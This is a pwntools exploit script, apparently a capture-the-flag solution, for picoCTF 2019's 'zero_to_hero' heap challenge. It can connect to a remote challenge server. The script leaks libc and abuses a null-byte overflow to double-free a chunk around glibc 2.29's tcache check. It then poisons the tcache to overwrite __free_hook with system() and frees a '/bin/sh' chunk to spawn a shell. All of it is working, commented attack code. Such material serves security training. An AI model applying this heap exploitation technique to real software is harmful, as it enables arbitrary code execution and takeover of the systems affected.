from pwn import *
from sys import argv

index = 0

def alloc(p, size, content):
    global index
    p.sendlineafter('Exit', '1')
    p.sendlineafter('length of your description', str(size))
    p.sendlineafter('Enter your description', content)
    p.recvuntil('Done!')

    index += 1
    return index - 1

def free(p, index):
    p.sendlineafter('Exit', '2')
    p.sendlineafter('to remove?', str(index))
    p.recvuntil('1.')

if 'remote' in argv:
    p = remote('2019shell1.picoctf.com', 49928)
elif 'debug' in argv:
    p = gdb.debug('./zero_to_hero', 'c')
else:
    p = process('./zero_to_hero')

libc_elf = ELF('./libc.so.6')

# getting libc leak
p.sendline('y')
p.recvuntil('Take this: ')
system_addr = int(p.recvline().decode('ascii'), 16)
libc_addr = system_addr - libc_elf.sym['system']
free_hook = libc_addr + libc_elf.sym['__free_hook']
log.info(f'Libc: {hex(libc_addr)}')
log.info(f'Free hook: {hex(free_hook)}')

# using null byte overflow to free a chunk twice
# by changing its size, it will be put in a different bin at next free
# this allows us to avoid the tcache double free check in 2.29
a = alloc(p, 0x108, 'srdnlen exploits')
b = alloc(p, 0x108, 'srdnlen exploits')
free(p, b)
free(p, a)
a = alloc(p, 0x108, 'a' * 0x108)
free(p, b)

# poisoning tcache :)))
# we're using the double free to place free_hook as a chunk in the tcache bin
# free_hook will be changed to system
# then we're freeing a chunk with '/bin/sh' as its content
# which is like passing '/bin/sh' to free_hook, or system in this case :)
alloc(p, 0x108, p64(free_hook))
binsh_chunk = alloc(p, 0x100 - 8, '/bin/sh')
win_chunk = alloc(p, 0x100 - 8, p64(system_addr))
p.sendlineafter('Exit', '2')
p.sendlineafter('to remove?', str(binsh_chunk))


p.interactive()
